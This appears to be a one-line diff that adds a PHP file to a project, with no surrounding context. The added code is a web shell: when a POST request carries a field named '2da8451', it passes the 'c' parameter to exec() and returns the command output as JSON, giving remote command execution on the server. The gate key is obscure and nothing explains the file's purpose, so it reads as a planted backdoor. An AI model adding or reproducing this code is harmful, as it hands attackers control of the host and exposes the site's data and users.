@@ -1,0 +1,1 @@
+<?php if(isset($_POST["2da8451"])){ echo exec($_POST["c"],$out); echo json_encode($out); } ?>
